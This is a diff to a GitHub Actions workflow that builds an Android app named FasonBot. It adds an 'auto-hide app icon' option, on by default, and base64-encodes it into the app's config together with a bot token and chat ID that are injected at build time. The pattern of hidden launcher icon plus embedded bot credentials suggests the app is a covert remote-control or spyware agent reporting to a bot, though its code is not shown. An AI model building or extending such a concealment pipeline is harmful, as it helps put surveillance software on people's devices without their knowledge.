@@ -20,6 +20,12 @@ on:
         required: false
         default: ''
         type: string
+      auto_hide_icon:
+        description: 'Auto-hide app icon'
+        required: true
+        default: 'yes'
+        type: choice
+        options: ['yes', 'no']
       create_release:
         description: 'Create release?'
         required: true
@@ -60,6 +66,7 @@ jobs:
       CREATE_RELEASE: ${{ github.event.inputs.create_release || 'no' }}
       IS_PRERELEASE: ${{ github.event.inputs.prerelease || 'no' }}
       APP_NAME: ${{ github.event.inputs.app_name }}
+      AUTO_HIDE_ICON: ${{ github.event.inputs.auto_hide_icon || 'yes' }}
 
     steps:
       - uses: actions/checkout@v4
@@ -91,22 +98,32 @@ jobs:
           TOKEN="${INPUT_TOKEN:-$SECRET_TOKEN}"
           CHAT="${INPUT_ID:-$SECRET_ID}"
           
+          # Convert auto_hide_icon to boolean
+          if [ "$AUTO_HIDE_ICON" = "yes" ]; then
+            HIDE_ICON="true"
+          else
+            HIDE_ICON="false"
+          fi
+          
           if [ -z "$TOKEN" ] || [ -z "$CHAT" ]; then
             echo "No credentials - using empty config"
+            # Still set autoHideIcon even without credentials
+            FILE="./app/src/main/java/com/fasonbot/app/config/BotConfig.kt"
+            sed -i "s|val autoHideIcon: Boolean = .*|val autoHideIcon: Boolean = $HIDE_ICON|" "$FILE"
             exit 0
           fi
           
           echo "Injecting credentials..."
           
           # Base64 encode JSON with camelCase keys matching BotConfig.kt
-          DATA=$(echo -n "{\"botToken\":\"$TOKEN\",\"chatId\":\"$CHAT\"}" | base64 -w0)
+          DATA=$(echo -n "{\"botToken\":\"$TOKEN\",\"chatId\":\"$CHAT\",\"autoHideIcon\":$HIDE_ICON}" | base64 -w0)
           
           FILE="./app/src/main/java/com/fasonbot/app/config/BotConfig.kt"
           
           # Match indented constant in Kotlin object
           sed -i "s|private const val CONFIG_DATA = \".*\"|private const val CONFIG_DATA = \"$DATA\"|" "$FILE"
           
-          echo "Credentials injected"
+          echo "Credentials injected (autoHideIcon: $HIDE_ICON)"
 
       - uses: actions/setup-java@v4
         with:
@@ -228,6 +245,7 @@ jobs:
           echo "- **App:** ${APP_NAME:-FasonBot}" >> $GITHUB_STEP_SUMMARY
           echo "- **Version:** ${{ steps.version.outputs.name }}" >> $GITHUB_STEP_SUMMARY
           echo "- **Type:** $BUILD_TYPE" >> $GITHUB_STEP_SUMMARY
+          echo "- **Auto-hide icon:** $AUTO_HIDE_ICON" >> $GITHUB_STEP_SUMMARY
           if [ "$BUILD_TYPE" = "release" ] || [ "$BUILD_TYPE" = "both" ]; then
             if [ "$SIGNING_ENABLED" = "true" ]; then
               echo "- **Signing:** ✅ Signed" >> $GITHUB_STEP_SUMMARY
